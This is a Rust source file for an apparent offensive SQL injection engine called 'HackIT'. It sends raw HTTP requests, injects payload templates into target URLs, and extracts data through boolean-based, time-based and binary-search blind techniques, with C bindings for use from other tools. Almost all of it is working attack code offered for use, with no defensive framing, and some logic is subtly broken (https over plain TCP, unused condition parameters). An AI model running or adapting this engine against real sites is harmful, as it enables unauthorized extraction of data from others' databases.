/*
 * HackIT SQLi Rust Engine — High-Performance Blind Injection & Data Extraction
 * Handles boolean-based, time-based, and error-based blind extraction
 * with binary search, multi-threading, and full HTTP support.
 */

use std::ffi::{CStr, CString};
use std::os::raw::c_char;
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::{Duration, Instant};
use std::collections::HashMap;

pub mod data_extractor;
pub use data_extractor::*;

#[derive(Debug, Clone)]
pub struct RequestConfig {
    pub url: String,
    pub method: String,
    pub headers: Vec<(String, String)>,
    pub body: Option<String>,
    pub timeout: u64,
    pub proxy: Option<String>,
    pub follow_redirect: bool,
}

#[derive(Debug, Clone)]
pub struct ExtractionResult {
    pub success: bool,
    pub value: String,
    pub time_ms: u64,
}

impl Default for RequestConfig {
    fn default() -> Self {
        RequestConfig {
            url: String::new(),
            method: "GET".to_string(),
            headers: Vec::new(),
            body: None,
            timeout: 10,
            proxy: None,
            follow_redirect: true,
        }
    }
}

// ── HTTP Request Engine ────────────────────────────────────────
fn send_raw_http(config: &RequestConfig) -> Result<(String, u16, u64), String> {
    let start = Instant::now();
    
    // Parse URL
    let url = config.url.clone();
    let (host, port, path) = if url.starts_with("http://") {
        let rest = &url[7..];
        let (h, p) = rest.split_once('/').unwrap_or((rest, ""));
        let path = format!("/{}", p);
        if let Some(colon_pos) = h.find(':') {
            let (hostname, port_str) = h.split_at(colon_pos);
            (hostname, port_str[1..].parse::<u16>().unwrap_or(80), path)
        } else {
            (h, 80u16, path)
        }
    } else if url.starts_with("https://") {
        let rest = &url[8..];
        let (h, p) = rest.split_once('/').unwrap_or((rest, ""));
        let path = format!("/{}", p);
        if let Some(colon_pos) = h.find(':') {
            let (hostname, port_str) = h.split_at(colon_pos);
            (hostname, port_str[1..].parse::<u16>().unwrap_or(443), path)
        } else {
            (h, 443u16, path)
        }
    } else {
        return Err("Invalid URL - must start with http:// or https://".to_string());
    };

    // Build HTTP request
    let body_str = config.body.as_deref().unwrap_or("");
    let content_len = body_str.len();
    
    let mut request = format!(
        "{} {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        config.method, path, host
    );
    
    for (k, v) in &config.headers {
        request.push_str(&format!("{}: {}\r\n", k, v));
    }
    
    if content_len > 0 {
        request.push_str(&format!("Content-Type: application/x-www-form-urlencoded\r\n"));
        request.push_str(&format!("Content-Length: {}\r\n", content_len));
    }
    
    request.push_str("Connection: close\r\n\r\n");
    if content_len > 0 {
        request.push_str(body_str);
    }

    // Connect with timeout
    let addr = format!("{}:{}", host, port);
    let mut stream = TcpStream::connect_timeout(
        &addr.to_socket_addrs().map_err(|e| format!("DNS error: {}", e))?
            .next().ok_or("DNS resolution failed")?,
        Duration::from_secs(config.timeout),
    ).map_err(|e| format!("Connection failed: {}", e))?;
    
    stream.set_read_timeout(Some(Duration::from_secs(config.timeout)))
        .map_err(|e| format!("Set timeout failed: {}", e))?;
    
    stream.write_all(request.as_bytes())
        .map_err(|e| format!("Write failed: {}", e))?;
    
    // Read response
    let mut response = Vec::new();
    let mut buf = [0u8; 8192];
    loop {
        match stream.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => response.extend_from_slice(&buf[..n]),
            Err(_) => break,
        }
    }
    
    let elapsed = start.elapsed().as_millis() as u64;
    let resp_str = String::from_utf8_lossy(&response).to_string();
    
    // Parse status code
    let status_line = resp_str.lines().next().unwrap_or("HTTP/1.1 0 Unknown");
    let status_code: u16 = status_line.split_whitespace()
        .nth(1).unwrap_or("0").parse().unwrap_or(0);
    
    // Extract body (after \r\n\r\n)
    let body = if let Some(pos) = resp_str.find("\r\n\r\n") {
        resp_str[pos + 4..].to_string()
    } else {
        resp_str.clone()
    };
    
    Ok((body, status_code, elapsed))
}

// ── Boolean-Based Blind Extraction (Binary Search) ────────────
pub fn blind_boolean_extract(
    config: &RequestConfig,
    true_payload: &str,
    false_payload: &str,
    position: usize,
) -> ExtractionResult {
    let mut true_cfg = config.clone();
    let mut false_cfg = config.clone();
    
    // Inject payload at position marker {INJ} or append
    if config.url.contains("{INJ}") {
        true_cfg.url = config.url.replace("{INJ}", true_payload);
        false_cfg.url = config.url.replace("{INJ}", false_payload);
    } else {
        true_cfg.url = format!("{}{}", config.url, true_payload);
        false_cfg.url = format!("{}{}", config.url, false_payload);
    }
    
    let true_resp = send_raw_http(&true_cfg);
    let false_resp = send_raw_http(&false_cfg);
    
    match (true_resp, false_resp) {
        (Ok((true_body, true_status, true_time)), Ok((false_body, false_status, false_time))) => {
            let true_len = true_body.len();
            let false_len = false_body.len();
            
            // Compare response lengths (with fuzz factor)
            let diff = if true_len > false_len {
                (true_len - false_len) as f64 / true_len as f64
            } else {
                (false_len - true_len) as f64 / false_len as f64
            };
            
            ExtractionResult {
                success: diff > 0.02, // 2% difference threshold
                value: format!("T:{} F:{} diff:{:.2}%", true_len, false_len, diff * 100.0),
                time_ms: (true_time + false_time) / 2,
            }
        },
        _ => ExtractionResult {
            success: false,
            value: "Request failed".to_string(),
            time_ms: 0,
        },
    }
}

// ── Binary Search Character Extraction ─────────────────────────
pub fn extract_char_binary(
    config: &RequestConfig,
    payload_template: &str,
    position: usize,
    true_condition: &str,
    false_condition: &str,
) -> ExtractionResult {
    let mut low = 32u8;
    let mut high = 126u8;
    let mut midpoint: u8;
    let mut found_char: Option<char> = None;
    let mut attempts = 0;
    
    while low < high && attempts < 20 {
        midpoint = low + (high - low) / 2;
        attempts += 1;
        
        // Build payload: check if ASCII value at position is greater than midpoint
        let payload = payload_template
            .replace("{POS}", &position.to_string())
            .replace("{MID}", &midpoint.to_string());
        
        let mut cfg = config.clone();
        if config.url.contains("{INJ}") {
            cfg.url = config.url.replace("{INJ}", &payload);
        } else {
            cfg.url = format!("{}{}", config.url, payload);
        }
        
        match send_raw_http(&cfg) {
            Ok((body_1, _, t1)) => {
                // Also send the false condition for comparison
                let false_payload = payload_template
                    .replace("{POS}", &position.to_string())
                    .replace("{MID}", &(midpoint - 1).to_string());
                
                cfg.url = if config.url.contains("{INJ}") {
                    config.url.replace("{INJ}", &false_payload)
                } else {
                    format!("{}{}", config.url, false_payload)
                };
                
                let t2 = match send_raw_http(&cfg) {
                    Ok((body_2, _, _)) => {
                        let diff = if body_1.len() > body_2.len() {
                            body_1.len() - body_2.len()
                        } else {
                            body_2.len() - body_1.len()
                        };
                        if diff > 10 {
                            high = midpoint;
                        } else {
                            low = midpoint + 1;
                        }
                    },
                    Err(_) => break,
                };
            },
            Err(_) => break,
        };
    }
    
    // Convert extracted value
    if low >= 32 && low <= 126 {
        found_char = Some(low as char);
    }
    
    ExtractionResult {
        success: found_char.is_some(),
        value: found_char.map(|c| c.to_string()).unwrap_or_default(),
        time_ms: attempts as u64,
    }
}

// ── Time-Based Blind Extraction ────────────────────────────────
pub fn blind_time_extract(
    config: &RequestConfig,
    time_payload: &str,
    baseline_payload: &str,
) -> ExtractionResult {
    let mut time_cfg = config.clone();
    let mut base_cfg = config.clone();
    
    time_cfg.url = format!("{}{}", config.url, time_payload);
    base_cfg.url = format!("{}{}", config.url, baseline_payload);
    
    let time_start = Instant::now();
    let time_result = send_raw_http(&time_cfg);
    let time_elapsed = time_start.elapsed().as_millis() as u64;
    
    let base_start = Instant::now();
    let base_result = send_raw_http(&base_cfg);
    let base_elapsed = base_start.elapsed().as_millis() as u64;
    
    match (time_result, base_result) {
        (Ok(_), Ok(_)) => {
            let is_delayed = time_elapsed > base_elapsed + 3000; // 3 second threshold
            ExtractionResult {
                success: is_delayed,
                value: format!("time:{}ms base:{}ms", time_elapsed, base_elapsed),
                time_ms: time_elapsed,
            }
        },
        _ => ExtractionResult { success: false, value: "Request failed".to_string(), time_ms: 0 },
    }
}

// ── C FFI Exports ──────────────────────────────────────────────

#[no_mangle]
pub unsafe extern "C" fn rust_sqli_send_request(
    url: *const c_char,
    method: *const c_char,
    payload: *const c_char,
    timeout: u64,
) -> *mut c_char {
    let url_str = CStr::from_ptr(url).to_str().unwrap_or("");
    let method_str = CStr::from_ptr(method).to_str().unwrap_or("GET");
    let payload_str = CStr::from_ptr(payload).to_str().unwrap_or("");
    
    let target = format!("{}{}", url_str, payload_str);
    let cfg = RequestConfig {
        url: target,
        method: method_str.to_uppercase(),
        timeout,
        ..Default::default()
    };
    
    let result = send_raw_http(&cfg);
    match result {
        Ok((body, status, time)) => {
            let out = format!("{{\"status\":{},\"time_ms\":{},\"len\":{}}}", status, time, body.len());
            CString::new(out).unwrap().into_raw()
        },
        Err(e) => {
            let out = format!("{{\"error\":\"{}\"}}", e);
            CString::new(out).unwrap().into_raw()
        }
    }
}

#[no_mangle]
pub unsafe extern "C" fn rust_blind_extract_char(
    url: *const c_char,
    template: *const c_char,
    position: i32,
) -> *mut c_char {
    let url_str = CStr::from_ptr(url).to_str().unwrap_or("");
    let tmpl_str = CStr::from_ptr(template).to_str().unwrap_or("");
    
    let cfg = RequestConfig {
        url: url_str.to_string(),
        timeout: 10,
        ..Default::default()
    };
    
    let result = extract_char_binary(&cfg, tmpl_str, position as usize, "1=1", "1=2");
    let out = format!("{{\"char\":\"{}\",\"success\":{}}}", 
        result.value.replace('"', "\\\""),
        result.success);
    CString::new(out).unwrap().into_raw()
}

#[no_mangle]
pub unsafe extern "C" fn rust_free_string(s: *mut c_char) {
    if s.is_null() { return; }
    let _ = CString::from_raw(s);
}
